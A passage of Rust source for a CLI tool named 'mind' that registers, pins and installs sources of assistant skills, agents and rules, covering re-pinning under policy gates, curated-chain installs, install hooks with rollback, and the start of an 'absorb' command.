                    registry.save(paths)?;
                    return Err(e); // a hook failed; leave the source melded
                }
            }
        }
    }

    if !link_only {
        // spec: CLI-217 CLI-156 -- the `--json` re-meld installs through the
        // SILENT helpers `meld`'s fresh branch uses, then answers with ONE
        // object of its own. Routed through `install_source_items` instead, this
        // branch emitted `learn`'s result object (an action the caller never
        // invoked) and either returned before its own object or printed a second
        // one after it.
        if out.json {
            // spec: CLI-236 -- a re-meld honors `--learn` too: the named subset
            // installs instead of the whole set, and the curated chain
            // (DSC-54/55/58) is left alone.
            let (installed, pending) = if learn_patterns.is_empty() {
                let (mut inst, pend) = install_source_items_for_json(paths, &source_name, flow)?;
                inst.extend(install_curated_sources_for_json(
                    paths,
                    &source_name,
                    recursive,
                    flow,
                )?);
                (inst, pend)
            } else {
                install_source_items_matching_for_json(paths, &source_name, learn_patterns, flow)?
            };
            let mut result = MutationResult::new("meld", &source_name, "already-melded");
            // spec: DSC-95 -- `installed` rides straight off `learn_collecting`'s
            // raw keys, each embedding a source-controlled bare name; sanitize
            // every one before it lands in the `--json` envelope, the same way
            // `emit_meld_json_result` and `learn()` do for their own.
            result.installed = installed.iter().map(|k| strip_ansi(k)).collect();
            if pending > 0 {
                result.pending_items = Some(pending);
            }
            return print_json(&result);
        }
        // spec: CLI-236 -- the named subset only; a pattern matching nothing is
        // an error, and the curated chain is not walked. The CLI-12 status
        // report still runs afterwards, as it does for any other re-meld.
        if !learn_patterns.is_empty() {
            note_learn_ignores_recursive(recursive);
            install_source_items_matching(paths, &source_name, learn_patterns, flow)?;
            return source_status(paths, &source_name);
        }
        let item_ref = format!("{source_name}#*");
        let to_install = match learn_preview(paths, &item_ref) {
            Ok(plan) => plan.install_count,
            Err(MindError::ItemNotFound { .. }) => 0,
            Err(e) => return Err(e),
        };
        if to_install > 0 {
            install_source_items(paths, &source_name, flow)?;
            // Install the curated chain: every nested source with `--recursive`
            // (DSC-55), or just the curator's `install = true` entries (DSC-58).
            // The nested sources are already registered, so nothing re-registers.
            install_curated_sources(paths, &source_name, recursive, flow)?;
            return Ok(());
        }
        // A pure super-source has no own items; still install the curated chain
        // (all of it with --recursive, else the `install = true` entries).
        install_curated_sources(paths, &source_name, recursive, flow)?;
        if recursive {
            return Ok(());
        }
    }
    // Only `--register-only` (link_only) reaches this under `--json`; the
    // install branch above answers with its own object.
    if out.json {
        return print_json(&MutationResult::new("meld", &source_name, "already-melded"));
    }
    source_status(paths, &source_name)
}

/// Re-pin an already-registered source (CLI-209): resolve the caller's
/// `--pin` request against the source's currently recorded pin (the base
/// point a bare `--pin HEAD` freezes, via `resolve_checkout_pin` -- the same
/// resolution `meld_recursive` performs at a first meld), re-check-out the
/// existing clone at the resolved point (or, for a source that is still
/// linked -- local and never pinned -- clone a fresh snapshot into the
/// sources tree, mirroring `meld_recursive`'s Step 3/4, so the live working
/// tree is never touched), and record the resolved pin and commit.
///
/// Transactional in the same spirit as `meld_recursive` (CLI-18): every git
/// operation runs BEFORE any field on the registered `Source` is mutated or
/// the registry is saved, so a resolution/clone failure (a bad ref, a network
/// error) leaves the source's pin, commit, and clone dir exactly as they
/// were. The POL-11/POL-20 allowlist and require-pinned gates are
/// re-evaluated here exactly as they are at a first meld, so a source whose
/// identity fell out of policy since it was melded cannot be silently
/// re-pinned around the gate.
pub(crate) fn repin_source(paths: &Paths, source_name: &str, pin: PinRequest) -> Result<()> {
    let out = crate::render::ctx();
    // spec: POL-3 -- load once; Err = invalid policy (fail closed via `?`),
    // None = unmanaged, inert.
    let policy = Policy::load()?;
    let mut registry = Registry::load(paths)?;
    let Some(source) = registry.find(source_name) else {
        // The caller only invokes this after confirming the source is
        // registered (`is_melded`); nothing to do if it vanished underneath.
        return Ok(());
    };

    // spec: CLI-209/POL-11 -- the allowlist gate applies to a re-pin exactly
    // as it does at a first meld (meld_recursive's POL-36 check).
    if let Some(policy) = policy.as_ref() {
        let identity = source.base_identity();
        let allowed = policy.allow_matches(&identity);
        if policy.lock() && !allowed {
            if let Some(path) = effective_policy_path() {
                // spec: POL-37
                eprintln!("hint: managed policy at {path}");
            }
            return Err(MindError::SourceNotAllowed { identity });
        }
        if !policy.lock() && !allowed {
            // POL-13: with lock off, allow is advisory; warn but proceed.
            eprintln!(
                "warning: source '{identity}' is not in the managed policy's allowlist (advisory; not enforced because [sources].lock is false)"
            );
        }
    }

    let old_pin = source.pin.clone();
    let old_commit = source.commit.clone();
    let url = source.url.clone();
    let is_local = source.is_local();

    let (checkout_pin, freeze) = resolve_checkout_pin(pin, old_pin.clone());

    // spec: CLI-209/POL-20 -- the require-pinned gate applies identically to a
    // re-pin: a floating point (default/follow-branch) is forbidden unless the
    // request freezes it.
    let persisted_unpinned =
        !freeze && matches!(checkout_pin, Pin::DefaultBranch | Pin::FollowBranch(_));
    if let Some(policy) = policy.as_ref()
        && policy.pinned()
        && persisted_unpinned
    {
        return Err(MindError::UnpinnedSourceForbidden {
            identity: source_name.to_string(),
        });
    }

    // The target clone dir for a PINNED instance of this source. Stable
    // regardless of which specific pin is in effect (the sources-tree leaf
    // depends only on the identity alias, STO-59), so it can be computed
    // before the checkout runs. Force `is_linked() == false` on the probe so
    // a currently-linked local source's target resolves to the sources-tree
    // clone path, not its live working tree (mirrors meld_recursive Step 3);
    // a first-time local pin therefore clones a NEW directory rather than
    // touching the working tree the (still-linked) `url` points at.
    let mut probe = source.clone();
    if is_local {
        probe.pin = Pin::Ref(String::new());
    }
    let target = clone_dir_checked(paths, &probe)?;

    // Resolve/check out at the new point WITHOUT mutating the registered
    // `Source` yet (CLI-18): a failure here leaves `pin`/`commit`/the clone
    // exactly as they were.
    if target.join(".git").is_dir() {
        git::sync_to_pin(&url, &target, &checkout_pin)?;
    } else {
        // First pin on a linked local source (or a missing clone dir): clone
        // fresh; the live working tree at `url` is never touched.
        if target.exists() {
            std::fs::remove_dir_all(&target).map_err(|e| MindError::io(&target, e))?;
        }
        if let Some(parent) = target.parent() {
            crate::paths::mkdir_p(parent)?;
        }
        if let Err(e) = git::clone_at(&url, &target, &checkout_pin) {
            let _ = std::fs::remove_dir_all(&target);
            return Err(e);
        }
    }
    let resolved_commit = git::head_commit(&url, &target)?;
    // spec: CLI-200 -- a freeze always persists the resolved commit as an
    // immutable ref, same as a first meld's freeze (Step 4).
    let final_pin = if freeze {
        Pin::Ref(resolved_commit.clone())
    } else {
        checkout_pin
    };
    let changed = old_pin != final_pin || old_commit.as_deref() != Some(resolved_commit.as_str());

    // Only now, after the checkout succeeded, persist the result.
    let Some(source) = registry.sources.iter_mut().find(|s| s.name == source_name) else {
        return Ok(());
    };
    source.pin = final_pin.clone();
    source.commit = Some(resolved_commit);
    // spec: DSC-94 -- B4: sanitize at the sync-time re-read too.
    source.description = MindToml::load(&target)?
        .and_then(|m| m.source.description)
        .map(|d| strip_ansi(&d));
    registry.save(paths)?;

    if !out.json {
        if changed {
            println!(
                "{} re-pinned {source_name} {} -> {}",
                out.ok(),
                pin_description(&old_pin),
                pin_description(&final_pin),
            );
        } else {
            println!(
                "{} {source_name} already pinned to {}",
                out.bullet(),
                pin_description(&final_pin),
            );
        }
    }
    Ok(())
}

/// Install the items of the registered sources a super-source curates, walking
/// its transitive `[discover].sources` chain. The whole chain is always traversed
/// (so a deeper `install = true` or `install-items` is reached), but a given
/// nested source's items are offered for install only when:
///
/// - `all` is set (`meld --recursive`, DSC-55): install everything, or
/// - the entry has `install-items = [...]` (DSC-62): install exactly that subset, or
/// - the entry has `install = true` (DSC-58): install all of the nested source.
///
/// When `install-items` is present it governs; when absent `install` governs.
/// Reads each source's clone `mind.toml`; cycle-safe via a visited set; only
/// touches registered sources.
pub fn install_curated_sources(
    paths: &Paths,
    super_name: &str,
    all: bool,
    flow: InstallFlow,
) -> Result<()> {
    let registry = Registry::load(paths)?;
    let mut visited: HashSet<String> = HashSet::from([super_name.to_string()]);
    let mut queue: Vec<String> = vec![super_name.to_string()];
    while let Some(name) = queue.pop() {
        let Some(source) = registry.find(&name) else {
            continue;
        };
        // spec: LNK-8 -- an item-link instance curates nothing.
        if source.item_path.is_some() {
            continue;
        }
        let nested = MindToml::load(&source.clone_dir(paths))?
            .and_then(|m| m.discover)
            .map(|d| d.sources)
            .unwrap_or_default();
        for ns in nested {
            // spec: CLI-216 -- the install walk only resolves already-registered
            // identities; it clones nothing, so it must not repeat the CLI-215
            // note the melding parse already printed for this same entry.
            let Ok(mut spec) = parse_spec_quiet(&ns.source) else {
                continue;
            };
            // spec: STO-58 -- the nested source was melded under this entry's
            // effective alias (DSC-78), so its registered identity carries the
            // `@<alias>` suffix; resolve against that, not the bare name.
            spec.apply_alias(ns.effective_alias());
            if !visited.insert(spec.name.clone()) {
                continue; // already seen (cycle guard / diamond dedup)
            }
            if registry.find(&spec.name).is_some() {
                // Traverse every nested source, but install according to the
                // directive in effect (DSC-55 > DSC-62 > DSC-58):
                // - `all` (--recursive): install everything
                // - `install_items` Some(list): install exactly that subset
                //   (empty list = install nothing, like install = false)
                // - `install = true`: install all of the nested source
                if all {
                    install_source_items(paths, &spec.name, flow)?;
                } else if let Some(refs) = &ns.install_items {
                    // DSC-62: install_items governs; refs is the subset to offer.
                    install_source_items_subset(paths, &spec.name, refs, flow)?;
                } else if ns.install {
                    // DSC-58: install all of this nested source.
                    install_source_items(paths, &spec.name, flow)?;
                }
                queue.push(spec.name);
            }
        }
        // MKT-7: a marketplace catalog is a curated super-source too. Its in-repo
        // plugins are offered for install on meld like the catalog's own items
        // (CLI-23); its external plugins are register-only unless `all`
        // (--recursive, DSC-55), mirroring the DSC-54 default for nested sources.
        for (spec, in_repo) in marketplace_subsources(paths, source)? {
            if !visited.insert(spec.name.clone()) {
                continue;
            }
            if registry.find(&spec.name).is_some() {
                if all || in_repo {
                    install_source_items(paths, &spec.name, flow)?;
                }
                queue.push(spec.name);
            }
        }
    }
    Ok(())
}

/// Resolve the marketplace sub-sources a source curates (MKT-7): each
/// `.claude-plugin/marketplace.json` entry mapped to `(parsed source spec,
/// is_in_repo)`. Empty when the source has no marketplace manifest or an
/// authoritative `mind.toml` suppresses it (MKT-2). In-repo entries install by
/// default; external entries are register-only unless `--recursive`.
pub(crate) fn marketplace_subsources(
    paths: &Paths,
    source: &crate::source::Source,
) -> Result<Vec<(crate::source::Source, bool)>> {
    let clone = source.clone_dir(paths);
    if MindToml::load(&clone)?.is_some_and(|m| m.is_authoritative()) {
        return Ok(Vec::new());
    }
    let Some(mp) = plugin_manifest::find_marketplace_manifest(&clone) else {
        return Ok(Vec::new());
    };
    let mut out = Vec::new();
    for entry in plugin_manifest::load_marketplace_manifest(&mp)?.into_entries() {
        let in_repo = matches!(entry.source, plugin_manifest::PluginSource::InRepo { .. });
        // spec: CLI-216 -- resolving a marketplace entry to the identity it was
        // melded under; the meld already happened, so this parse is quiet.
        if let Ok(mut spec) = parse_spec_quiet(&marketplace_entry_spec(&entry, &clone)) {
            // spec: STO-58/MKT-8 -- an external entry was melded under the entry
            // name as its alias, so its registered identity carries `@<name>`.
            spec.apply_alias(Some(entry.name.clone()));
            out.push((spec, in_repo));
        }
    }
    Ok(out)
}

/// Install `source_name`'s items silently (no JSON emitted by `learn`) and
/// return `(installed_keys, pending_count)`. Used in `--json` mode so the
/// meld dispatcher can emit ONE combined JSON object (CLI-156).
///
/// - `flow.yes = true`: installs everything, returns `(keys, 0)`.
/// - `flow.yes = false`: returns `([], N)` where N is the pending item count
///   without prompting (json mode is always non-interactive).
pub(crate) fn install_source_items_for_json(
    paths: &Paths,
    source_name: &str,
    flow: InstallFlow,
) -> Result<(Vec<String>, usize)> {
    let item_ref = format!("{source_name}#*");
    let plan = match learn_preview(paths, &item_ref) {
        Ok(plan) => plan,
        Err(MindError::ItemNotFound { .. }) => return Ok((vec![], 0)),
        Err(e) => return Err(e),
    };
    if plan.install_count == 0 {
        return Ok((vec![], 0));
    }
    if flow.yes {
        let keys = learn_collecting(paths, &item_ref, flow)?;
        return Ok((keys, 0));
    }
    // No --yes in json mode: report the pending count without prompting.
    Ok((vec![], plan.install_count))
}

/// Walk the curated source chain and install each nested source's items
/// silently, returning all installed keys. Mirrors `install_curated_sources`
/// but collects keys instead of printing JSON results, so the meld dispatcher
/// can fold them into ONE combined JSON object (CLI-156).
pub(crate) fn install_curated_sources_for_json(
    paths: &Paths,
    super_name: &str,
    all: bool,
    flow: InstallFlow,
) -> Result<Vec<String>> {
    let registry = Registry::load(paths)?;
    let mut visited: HashSet<String> = HashSet::from([super_name.to_string()]);
    let mut queue: Vec<String> = vec![super_name.to_string()];
    let mut all_keys: Vec<String> = Vec::new();
    while let Some(name) = queue.pop() {
        let Some(source) = registry.find(&name) else {
            continue;
        };
        // spec: LNK-8 -- an item-link instance curates nothing.
        if source.item_path.is_some() {
            continue;
        }
        let nested = MindToml::load(&source.clone_dir(paths))?
            .and_then(|m| m.discover)
            .map(|d| d.sources)
            .unwrap_or_default();
        for ns in nested {
            // spec: CLI-216 -- the json twin of the install walk above; quiet for
            // the same reason.
            let Ok(mut spec) = parse_spec_quiet(&ns.source) else {
                continue;
            };
            // spec: STO-58 -- resolve the nested source under its effective alias.
            spec.apply_alias(ns.effective_alias());
            if !visited.insert(spec.name.clone()) {
                continue;
            }
            if registry.find(&spec.name).is_some() {
                if all {
                    let (keys, _) = install_source_items_for_json(paths, &spec.name, flow)?;
                    all_keys.extend(keys);
                } else if let Some(refs) = &ns.install_items {
                    if !refs.is_empty() && flow.yes {
                        for item_ref in refs {
                            let qualified = format!("{}#{}", spec.name, item_ref);
                            let keys = learn_collecting(paths, &qualified, flow)?;
                            all_keys.extend(keys);
                        }
                    }
                } else if ns.install {
                    let (keys, _) = install_source_items_for_json(paths, &spec.name, flow)?;
                    all_keys.extend(keys);
                }
                queue.push(spec.name);
            }
        }
        // MKT-7: marketplace sub-sources (in-repo install by default, external
        // only under `--recursive`). Mirrors `install_curated_sources`.
        for (spec, in_repo) in marketplace_subsources(paths, source)? {
            if !visited.insert(spec.name.clone()) {
                continue;
            }
            if registry.find(&spec.name).is_some() {
                if all || in_repo {
                    let (keys, _) = install_source_items_for_json(paths, &spec.name, flow)?;
                    all_keys.extend(keys);
                }
                queue.push(spec.name);
            }
        }
    }
    Ok(all_keys)
}

/// Build and emit the single meld JSON result (CLI-153, CLI-156).
///
/// Called by the dispatcher in `main.rs` after both the registration step
/// (`meld()`) and the post-meld install step (`install_source_items_for_json`)
/// have completed, so ONE object covers both outcomes.
///
/// `installed` contains the effective keys installed in this call.
/// `pending` is non-zero when `--yes` was absent and items remain to install.
// spec: CLI-153 CLI-156
pub(crate) fn emit_meld_json_result(
    summary: MeldSummary,
    installed: Vec<String>,
    pending: usize,
) -> Result<()> {
    let mut result = MutationResult::new("meld", &summary.source_name, "melded");
    result.count = Some(summary.added);
    result.skipped = summary.skipped;
    // spec: DSC-95 -- `installed` rides straight off `learn_collecting`'s raw
    // (unsanitized) keys; sanitize each one before it lands in the `--json`
    // envelope, mirroring `learn()`'s own `result.installed` assignment.
    result.installed = installed.iter().map(|k| strip_ansi(k)).collect();
    if pending > 0 {
        result.pending_items = Some(pending);
    }
    print_json(&result)
}

/// Print every item the source offers with its install state and the source
/// commit it was installed from, noting items whose commit lags the source
/// (CLI-12). Items are matched to the manifest by stable identity (source, kind,
/// bare name), so a prefix change does not lose them.
fn source_status(paths: &Paths, source_name: &str) -> Result<()> {
    let out = crate::render::ctx();
    let registry = Registry::load(paths)?;
    let Some(source) = registry.find(source_name) else {
        return Err(MindError::SourceNotFound {
            name: source_name.to_string(),
        });
    };
    // spec: CLI-213 -- `meld`'s already-melded branch reaches this, and meld's own
    // scan hard-fails on any scan error. `catalog::scan` would degrade a
    // `LinkedSourceGone` source into `Ok(vec![])` and print it as a healthy source
    // with "0 item(s)", contradicting the stderr warning next to it.
    let items = scan_one(paths, source)?;
    let manifest = Manifest::load(paths)?;

    let head = source
        .commit
        .as_deref()
        .map(short)
        .unwrap_or_else(|| "?".to_string());
    println!(
        "{} {source_name}: {} item(s) (source @ {head})",
        out.bullet(),
        items.len()
    );
    for it in &items {
        let installed = manifest
            .items
            .values()
            .find(|m| m.source == it.source && m.kind == it.kind && m.bare_name == it.name);
        match installed {
            Some(m) => {
                // CLI-75 / LIFE-11: an item is outdated exactly when `upgrade`
                // would act on it -- its source-content hash changed, or its
                // effective name changed (a namespace/prefix rename). A commit
                // advance that did not touch the item's content or name does NOT
                // mark it outdated; `upgrade` would report nothing pending for it.
                //
                // CLI-75: `upgrade` aborts the whole run via `?` when it cannot
                // hash the source content. This best-effort listing marker cannot
                // abort -- it must still print the other rows -- so it errs toward
                // flagging: a hash-computation error counts as drift (outdated)
                // rather than being silently read as "up to date". The same
                // hash-error-counts-as-lag rule is applied at all four marker
                // sites for consistency.
                let hash_lag = it.content_hash().map_or(true, |h| h != m.hash);
                let rename_lag = it.effective_name() != m.name;
                let stale = hash_lag || rename_lag;
                let lag = if stale {
                    out.yellow(" (outdated; run `mind upgrade`)")
                } else {
                    String::new()
                };
                // Stale installs use the ↑ marker, distinct from ✓ for current.
                let marker = if stale { out.stale() } else { out.ok() };
                // spec: DSC-95
                println!(
                    "  {} {}  installed @ {}{}",
                    marker,
                    it.display_key(),
                    out.green(&short(&m.commit)),
                    lag
                );
            }
            // spec: CLI-225 -- `it.key()` is a source-influenced `kind:name`
            // identity and lands in a pasteable `mind learn` remedy, so it is
            // shell-quoted before printing rather than framed in bare single
            // quotes.
            // spec: DSC-95 -- sanitize before shell-quoting too, so a
            // control/ANSI byte cannot ride the pasteable remedy either.
            None => println!(
                "  {} {}  not installed (run `mind learn {}`)",
                out.available(),
                it.display_key(),
                crate::error::shell_quote(&it.display_key())
            ),
        }
    }
    Ok(())
}

/// Set (or clear) the namespace prefix for a source, enforcing the mutability
/// lock (NS-30/CLI-161): the prefix may only change while no items from the
/// source are installed. If items are installed and the requested prefix differs
/// from the current one, returns `NamespaceLocked` listing those items. When the
/// prefix is unchanged nothing is written. Exported for the TUI source-details
/// dialog (TUI-53).
///
/// This changes the source's effective display prefix (`alias`), not its identity
/// (STO-58): the identity alias (`as_alias`) is fixed at meld, so this never
/// renames the source or relocates its clone.
pub fn set_source_namespace(
    paths: &Paths,
    source_name: &str,
    new_alias: Option<String>,
) -> Result<()> {
    // NS-25: validate the prefix (validate_prefix accepts None/empty).
    if let Some(ref a) = new_alias {
        crate::namespace::validate_prefix(a)?;
    }
    let mut registry = Registry::load(paths)?;
    let Some(source) = registry.sources.iter_mut().find(|s| s.name == source_name) else {
        return Ok(()); // source not found; nothing to change
    };
    let current = source.alias.clone().unwrap_or_default();
    let requested = new_alias.clone().unwrap_or_default();
    if current == requested {
        return Ok(()); // no change; nothing to do
    }
    // NS-30/CLI-161: check whether any of this source's items are installed.
    // DSC-95: `MindError::NamespaceLocked`'s `#[error(...)]` Display joins
    // `items` verbatim into the rejection message with no sanitizing step of
    // its own, so each key must already be display-safe here.
    let manifest = Manifest::load(paths)?;
    let installed_names: Vec<String> = manifest
        .items
        .values()
        .filter(|it| it.source == source_name)
        .map(|it| it.key().display())
        .collect();
    if !installed_names.is_empty() {
        return Err(MindError::NamespaceLocked {
            src_name: source_name.to_string(),
            items: installed_names,
        });
    }
    source.alias = new_alias;
    registry.save(paths)
}

/// If two selected items would install under the same `kind:name`, return that
/// key and the sources that collide on it.
fn colliding_install(targets: &[&CatalogItem]) -> Option<(String, Vec<String>)> {
    let mut by_key: std::collections::BTreeMap<String, Vec<String>> = Default::default();
    for t in targets {
        // Group by the raw (identity) key: sanitizing before grouping could
        // merge two distinct identities that differ only by a stripped
        // character, silently changing which items are reported as colliding.
        by_key
            .entry(t.key().as_str().to_string())
            .or_default()
            .push(t.source.clone());
    }
    by_key
        .into_iter()
        .find(|(_, sources)| sources.len() > 1)
        .map(|(key, sources)| {
            // spec: DSC-95 -- sanitize for display here, at the boundary:
            // both callers feed this straight into `MindError::AmbiguousItem`,
            // whose `#[error(...)]` Display joins `candidates` (and interpolates
            // `query`) verbatim, with no sanitizing step of its own.
            (
                crate::sanitize::strip_ansi(&key),
                sources
                    .iter()
                    .map(|s| crate::sanitize::strip_ansi(s))
                    .collect(),
            )
        })
}

/// Install one item, then run its install hook (HOOK-81) as the final step. On a
/// hook failure, roll the just-installed item back (remove its links and store
/// copy via the file registry) so it is left not installed, then propagate the
/// error. `dangerously_skip` runs item install/uninstall hooks unattended
/// (HOOK-83); `dangerously_skip_build` runs the item's build hook unattended
/// (HOOK-74).
///
/// `is_update` says this install replaces an existing install of the same
/// effective name, in which case the item's update hooks run in place of its
/// install hooks when it declares any (HOOK-125). In practice that is
/// `upgrade`'s in-place swap: the `learn` paths drop already-installed items
/// from the closure before reaching here (CLI-157, DEP-23), and an upgrade
/// RENAME is a removal plus a first install, not a re-install.
#[allow(clippy::too_many_arguments)]
fn install_item(
    paths: &Paths,
    item: &CatalogItem,
    commit: &str,
    siblings: &[CatalogItem],
    force: bool,
    dangerously_skip: bool,
    dangerously_skip_build: bool,
    is_update: bool,
) -> Result<crate::manifest::InstalledItem> {
    // spec: LIFE-50 -- refuse cleanly on a platform mind's symlink model does not
    // support, before creating (or reusing) any link.
    require_link_platform(paths)?;
    let mut installed =
        install::install(paths, item, commit, siblings, force, dangerously_skip_build)?;
    // HOOK-86: run every resolved install hook in declaration order (the scalar
    // shorthand is folded in as the first required hook). On a hook failure, roll
    // the just-installed item back.
    // spec: HOOK-125 -- on a re-install the item's update hooks replace them.
    let install_hooks = item.install_time_hooks(is_update);
    if !install_hooks.is_empty() {
        let store = paths.mind_home.join(&installed.store);
        match install::run_item_install_hooks(
            item,
            &install_hooks,
            &store,
            commit,
            dangerously_skip,
        ) {
            // spec: HOOK-110 -- persist the ran/skipped outcome on the item's
            // manifest record so a later `hooks run` (HOOK-102) does not treat
            // an already-run (or already-offered) hook as never having been
            // offered.
            Ok(recorded) => installed.install_hooks = recorded,
            Err(e) => {
                let _ = install::uninstall(paths, &installed);
                return Err(e);
            }
        }
    }
    Ok(installed)
}

/// Run an item's uninstall hooks (HOOK-82, HOOK-86) in declaration order if any
/// are declared, then remove the item via its file registry. `uninstall_hooks`
/// come from the live source catalog (nothing is recorded for them, HOOK-84) and
/// are empty when the source or item is no longer available, in which case removal
/// proceeds with no hook. A hook failure propagates BEFORE removal, leaving the
/// item installed.
fn uninstall_item(
    paths: &Paths,
    item: &crate::manifest::InstalledItem,
    uninstall_hooks: &[&crate::mindfile::ResolvedHook],
    commit: &str,
    dangerously_skip: bool,
) -> Result<()> {
    if !uninstall_hooks.is_empty() {
        let store = paths.mind_home.join(&item.store);
        if store.exists() {
            install::run_item_uninstall_hooks(
                item,
                uninstall_hooks,
                &store,
                commit,
                dangerously_skip,
            )?;
        }
    }
    install::uninstall(paths, item)
}

/// The catalog item matching an installed item by stable identity (source, kind,
/// bare name), used to read its live uninstall hooks (HOOK-82/86; nothing is
/// recorded for them, HOOK-84). `None` when the item is gone from the catalog.
fn item_catalog_match<'a>(
    catalog: &'a [CatalogItem],
    item: &crate::manifest::InstalledItem,
) -> Option<&'a CatalogItem> {
    catalog
        .iter()
        .find(|c| c.kind == item.kind && c.name == item.bare_name && c.source == item.source)
}

/// Derive the convention path for a `(kind, name)` pair within a source root,
/// relative to that root. Used by `absorb` to know where to move an item.
///
/// - skill   -> `skills/<name>/`  (returns a directory path)
/// - agent   -> `agents/<name>.md`
/// - rule    -> `rules/<name>.md`
/// - command -> `commands/<name>.md` (CMD-8)
///
/// A tool is never unmanaged (it is store-only, so it is never linked into a
/// lobe for `absorb` to find), and panics.
fn convention_path_in_root(
    root: &std::path::Path,
    kind: ItemKind,
    name: &str,
) -> std::path::PathBuf {
    match kind {
        ItemKind::Skill => root.join("skills").join(name),
        ItemKind::Agent => root.join("agents").join(format!("{name}.md")),
        ItemKind::Rule => root.join("rules").join(format!("{name}.md")),
        // spec: CMD-8
        ItemKind::Command => root.join("commands").join(format!("{name}.md")),
        ItemKind::Tool => panic!("tools are never unmanaged; absorb should not reach this"),
    }
}

/// Resolve the FIRST effective scan root for a source at `dest_path`.
/// Mirrors catalog.rs ~:208-219 (DSC-50): `[source].roots` in `mind.toml`, or the
/// repo root if unset. Consumer `--root` overrides are not relevant here since
/// the destination may not be melded yet; we use the repo's own declaration.
///
/// The resolved root is checked for containment within `dest_path`. A roots entry
/// like `../../x` that escapes the repo is rejected with [`MindError::InvalidRoot`].
/// The check uses `canonicalize` when both paths exist, and a `..`-folding
/// normalizer otherwise (so the check catches escapes even for a not-yet-created
/// scan root directory).
fn first_scan_root(dest_path: &std::path::Path) -> Result<std::path::PathBuf> {
    let mindfile = crate::mindfile::MindToml::load(dest_path).unwrap_or_default();
    let root_rel = mindfile
        .as_ref()
        .and_then(|m| m.source.roots.as_ref())
        .and_then(|r| r.first())
        .map(String::as_str)
        .unwrap_or(".");
    let candidate = dest_path.join(root_rel);

    // Use canonicalize when both paths exist (resolves symlinks + `..`). When the
    // candidate does not yet exist on disk, fold `..` components logically via
    // `normalize_path` so we still catch escaping roots.
    let canon_dest = std::fs::canonicalize(dest_path).unwrap_or_else(|_| dest_path.to_path_buf());
    let canon_root =
        std::fs::canonicalize(&candidate).unwrap_or_else(|_| normalize_path(&candidate));

    if !canon_root.starts_with(&canon_dest) {
        return Err(MindError::InvalidRoot {
            source_name: dest_path.to_string_lossy().into_owned(),
            root: root_rel.to_string(),
        });
    }
    Ok(candidate)
}

/// Normalize an absolute path by folding `..` components without requiring the
/// path to exist on disk. Used as a fallback when `canonicalize` fails (e.g.
/// the target does not yet exist). Only handles absolute paths; relative paths
/// are returned unchanged.
fn normalize_path(path: &std::path::Path) -> std::path::PathBuf {
    use std::path::Component;
    let mut components: Vec<&std::ffi::OsStr> = Vec::new();
    for comp in path.components() {
        match comp {
            Component::ParentDir => {
                // Pop the last non-root component, if any.
                if components
                    .last()
                    .is_some_and(|c| *c != std::ffi::OsStr::new("/"))
                {
                    components.pop();
                }
            }
            Component::CurDir => {
                // Skip `.` components.
            }
            _ => {
                components.push(comp.as_os_str());
            }
        }
    }
    components.iter().collect()
}

/// Resolve the destination prefix from the source's `mind.toml [source].prefix`
/// (alias/--as is not relevant for absorb since we are looking at the destination
/// source's declared prefix, which determines the effective name after learn).
fn dest_source_prefix(dest_path: &std::path::Path, registry: &Registry) -> Option<String> {
    // If the destination is already melded, use its recorded alias (consumer override)
    // first, then the toml prefix.
    if let Ok(spec) = parse_spec(&dest_path.to_string_lossy())
        && let Some(src) = registry.find(&spec.name)
        && let Some(alias) = src.alias.as_deref().filter(|a| !a.is_empty())
    {
        return Some(alias.to_string());
    }
    let mindfile = crate::mindfile::MindToml::load(dest_path).unwrap_or_default();
    mindfile
        .as_ref()
        .and_then(|m| m.source.prefix.clone())
        .filter(|p| !p.is_empty())
}

/// Build `absorb`'s reported `kind:name` key (the human "absorbed ... -> managed
/// as {key}" line and the `--json` `result.key` field) from the item's kind and
/// its destination-prefixed effective name.
///
/// spec: DSC-95 -- M7: `effective_name` is derived (via `crate::namespace::apply`)
/// from the unmanaged item's on-disk NAME, which comes off the lobe filesystem
/// and is NOT DSC-96-gated (that gate only runs at catalog-scan time for a
/// managed source's items, not for an unmanaged lobe entry `absorb` claims).
/// This used to compose the raw name straight into the printed/JSON key, right
/// alongside the ALREADY-sanitized `item.key().display()` used two lines away
/// in the same message -- one field sanitized, the other not, in the same
/// line. Sanitize here, at the one composition site, mirroring `item.key()
/// .display()`.
fn absorb_effective_key(kind: ItemKind, effective_name: &str) -> String {
    format!("{}:{}", kind.as_str(), strip_ansi(effective_name))
}

/// `mind absorb <ref> [--to <path>] [--force]` — claim a single unmanaged lobe
/// item into a version-controlled source and install it as a managed item.
///
/// This is the constructive inverse of `forget --unmanaged` (UNM-7).
// spec: ABS-1 ABS-2 ABS-3 ABS-4 ABS-5 ABS-6 ABS-7 ABS-8 ABS-9 ABS-10
pub fn absorb(
    paths: &Paths,
    item_ref_str: &str,
    to: Option<String>,
    force: bool,
    yes: bool,
) -> Result<()> {
    let out = crate::render::ctx();

    // ABS-1: reject glob refs before calling resolve (a glob treats the * literally
    // and would fall through to NotInstalled; we want the exact InvalidItemRef error).
    let parsed = parse_item_ref(item_ref_str)?;
    if is_glob(&parsed.name) {
        return Err(MindError::InvalidItemRef {
            name: item_ref_str.to_string(),
        });
    }

    // ABS-1: resolve to a single unmanaged item.
    let manifest = Manifest::load(paths)?;
    let unmanaged_items = crate::unmanaged::scan(paths, &manifest)?;
    let item = crate::unmanaged::resolve(&unmanaged_items, &parsed)?;

    // ABS-1: tools are never unmanaged, but guard anyway.
    if item.kind == ItemKind::Tool {
        return Err(MindError::InvalidItemRef {
            name: item_ref_str.to_string(),
        });
    }

    // ABS-2: resolve destination: --to > MIND_ABSORB_TO > config.absorb_to.
    // ABS-3: if none set, prompt on TTY; non-TTY => ConfirmationRequired.
    let (dest_path, interactive_dest) = resolve_absorb_dest(paths, to, yes)?;

    // ABS-5: destination must be a git repo (or built-in personal that was just
    // created). After resolve_absorb_dest, the personal dir is already git-init'd.
    if !crate::git::is_repo(&dest_path) {
        return Err(MindError::DestinationNotRepo {
            path: dest_path.to_string_lossy().into_owned(),
        });
    }

    // ABS-4: offer to save absorb_to when the destination was resolved interactively.
    if interactive_dest {
        offer_save_absorb_to(paths, &dest_path, yes)?;
    }

    // C5: Compute and validate the convention path relative to the destination's
    // first scan root. first_scan_root now canonicalizes and checks containment.
    let scan_root = first_scan_root(&dest_path)?;
    let dest_item_path = convention_path_in_root(&scan_root, item.kind, &item.name);

    // ABS-6: check for a collision at the destination convention path.
    if dest_item_path.exists() && !force {
        return Err(MindError::AbsorbCollision {
            kind: item.kind.as_str().to_string(),
            name: item.name.clone(),
